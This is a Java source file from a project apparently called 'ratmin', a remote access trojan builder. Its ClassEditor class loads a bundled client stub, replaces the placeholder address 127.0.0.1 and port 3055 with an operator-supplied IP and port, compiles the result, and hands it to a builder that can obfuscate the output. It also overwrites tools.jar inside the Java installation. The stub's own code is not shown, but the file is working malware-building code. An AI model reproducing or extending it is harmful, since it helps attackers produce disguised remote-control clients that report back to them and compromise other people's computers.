package me.slimig.ratmin.utils;

import java.io.BufferedReader;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

import javax.tools.JavaCompiler;
import javax.tools.ToolProvider;

import me.slimig.ratmin.user_interface.Ratmin;

public class ClassEditor {

    public static void replaceSelected(String ip, String port, String filename, boolean Obfuscate) {
        InputStream classfile = Ratmin.class.getResourceAsStream("/resources/DummyStub.txt");
        InputStream toolsfile = Ratmin.class.getResourceAsStream("/resources/tools.jar");
        Path classpath = Paths.get("DummyStub.java").toAbsolutePath();
        Path toolpath = Paths.get(System.getProperty("java.home") + "\\lib\\tools.jar").toAbsolutePath();

        try {
            Files.copy(classfile, classpath, StandardCopyOption.REPLACE_EXISTING);
            Files.copy(toolsfile, toolpath, StandardCopyOption.REPLACE_EXISTING);
        } catch (IOException e1) {
            e1.printStackTrace();
        }
        String[] filenames = { "DummyStub.java" };

        try {
            FileOutputStream errorStream = new FileOutputStream("Errors.txt");

            // input the file content to the StringBuffer "input"
            BufferedReader file = new BufferedReader(new FileReader("DummyStub.java"));
            String line;
            StringBuffer inputBuffer = new StringBuffer();

            while ((line = file.readLine()) != null) {
                inputBuffer.append(line);
                inputBuffer.append('\n');
            }
            String inputStr = inputBuffer.toString();

            file.close();

            // Debug System.out.println(inputStr); // check that it's inputted right

            // this if structure determines whether or not to replace "0" or "1"

            inputStr = inputStr.replace("127.0.0.1", ip);
            inputStr = inputStr.replace("3055", port);

            // check if the new input is right
            // Debug System.out.println("----------------------------------\n" + inputStr);

            // write the new String with the replaced line OVER the same file
            FileOutputStream fileOut = new FileOutputStream("DummyStub.java");
            fileOut.write(inputStr.getBytes());
            fileOut.close();
            try {
                JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();

                int compilationResult = compiler.run(null, null, errorStream, filenames);

                if (compilationResult == 0) {
                    System.out.println("Compilation is successful");
                    ClientBuilder c = new ClientBuilder();
                    c.build(filename, Obfuscate);
                } else {
                    System.out.println("Compilation Failed");
                }
            } catch (Exception e) {
                e.printStackTrace();
                System.out.println("error in compiler");
            }
        } catch (Exception e) {
            System.out.println("Problem reading file.");
        }
    }

    // TODO method : replaceSelected("Do the dishes", "1");

}
